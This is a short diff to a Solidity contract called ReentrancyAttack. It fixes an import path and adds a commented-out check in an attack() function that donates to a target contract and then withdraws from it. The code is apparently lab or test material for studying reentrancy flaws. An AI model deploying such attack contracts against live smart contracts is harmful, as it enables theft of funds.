@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "./Reentrancy";
+import "./Reentrancy.sol";
 
 contract ReentrancyAttack {
     Reentrancy public target;
@@ -15,6 +15,7 @@ contract ReentrancyAttack {
     }
 
     function attack() external payable {
+        // require(msg.value >= 1);
         target.donate{value: 3 wei, gas: 40000000}(address(this));
         target.withdraw(1 wei);
     }
